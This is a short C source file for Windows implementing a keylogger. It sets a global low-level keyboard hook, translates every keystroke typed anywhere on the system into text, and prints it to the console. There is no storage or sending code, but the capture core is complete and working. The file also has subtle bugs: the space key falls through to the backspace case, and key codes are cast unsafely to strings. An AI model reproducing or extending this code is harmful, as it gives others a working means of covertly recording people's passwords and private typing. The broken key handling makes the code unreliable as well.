#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

void mapKeypress(DWORD pressedKey, char **pszMappedKey) 
{
	char * mappedKey;

	switch (pressedKey)
	{
	case VK_SPACE:
		mappedKey = " ";
	case VK_BACK:
		mappedKey = "[BKSPC]";
		break;
	case VK_TAB:
		mappedKey = "[TAB]";
		break;
	case VK_RETURN:
		mappedKey = "[ENTER]\n";
		break;
	case VK_CONTROL:
		mappedKey = "[CTRL]";
		break;
	case VK_MENU:
		mappedKey = "[ALT]";
		break;
	case VK_CAPITAL:
		mappedKey = "[CAPS]";
		break;
	case VK_ESCAPE:
		mappedKey = "[ESC]";
		break;
	default:
		mappedKey = "[UNK]";
		break;
	}

	*pszMappedKey = mappedKey;
}

int shiftFlag = 0;
LRESULT CALLBACK kbCallback(int nCode, WPARAM wParam, LPARAM lParam) 
{
	if (nCode < 0) 
	{
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	DWORD pressedKey;
	char * mappedKey;
	KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

	if (wParam == WM_KEYDOWN && 
		(pKeyboard->vkCode == VK_LSHIFT || pKeyboard->vkCode == VK_RSHIFT )) 
	{
		// Turn on shift flag
		shiftFlag = 1;
	}

	if (wParam == WM_KEYUP) {
		pressedKey = pKeyboard->vkCode;

		if (pressedKey == VK_LSHIFT || pressedKey == VK_RSHIFT) 
		{
			shiftFlag = 0;
			// Shift key released. No output
			mappedKey = "\0";
		}
		else if (pressedKey > 0 && pressedKey < 0x30) 
		{
			// Escape seq key
			mapKeypress(pressedKey, &mappedKey);
		}
		else if (pressedKey >= 0x41 && pressedKey <= 0x5a) 
		{
			// A-Z VKCodes default to capital
			// Handle lowercase a-z based on shift flag
			if (shiftFlag == 0) {
				pressedKey += 0x20;
			}

			mappedKey = (char *)&pressedKey;
		}
		else
		{
			mappedKey = (char *)&pressedKey;
		}
	
		printf("%s", mappedKey);
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(int argc, char **argv) {
	// Get app instance
	HINSTANCE instance = GetModuleHandle(NULL);

	// Set global keyboard hook to call kbCallback
	HHOOK kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, kbCallback, instance, 0);
	
	// Message loop
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}